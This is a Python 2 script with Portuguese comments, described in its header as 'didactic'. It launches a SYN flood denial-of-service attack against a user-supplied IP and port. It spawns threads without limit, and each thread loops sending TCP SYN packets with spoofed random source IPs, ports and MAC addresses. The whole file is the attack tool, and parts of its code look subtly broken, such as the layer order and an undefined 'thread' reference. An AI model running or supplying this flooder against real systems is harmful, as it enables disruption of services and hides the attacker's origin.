#!/usr/bin/python
#coding=utf-8
#coded by:S0ph0s
# Programa para fins didáticos a qual demonstra o ataque de SYN FLOOD.

from os import system
from random import randint	
import socket
from time import sleep
from thread import start_new_thread
from sys import exit
from scapy.all import *
from scapy.error import Scapy_Exception
number = 0
red = '33[31m'

def synTCP(ip_alvo,porta_alvo):
	ip = IP()
	tcp = TCP()
	ip.dst = ip_alvo # recebendo IP do alvo
	ip.src = "%i.%i.%i.%i" % (randint(1,254),randint(1,254),randint(1,254),randint(1,254))# spoofing do IP de modo aleatorio 
	tcp.sport = randint(1,65535) # porta de origem para spoofing de 1 a 65535
	tcp.dport = porta_alvo # porta do alvo
	tcp.flags = "S" # SYN flood ataque
	send(ip/tcp/Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff"), loop= 1, verbose=1) #empacotando + MAC Spoofing
	sleep(5) #tempo de espera para finalizar a função
    	thread.exit() #encerrando a thread

ip_alvo = raw_input ("Digite o IP: ")
porta_alvo = input ("Digite a porta :")

while(1):
	try:
		number = number + 1 # contador de pacotes
		start_new_thread(synTCP,(ip_alvo,porta_alvo )) # criando a thread enviando IP e PORTA para função
	 	print "Número de requisições ---> %s" %str(number)
	except socket.error:
		print ("Ataque encerrou!")
		exit(1)


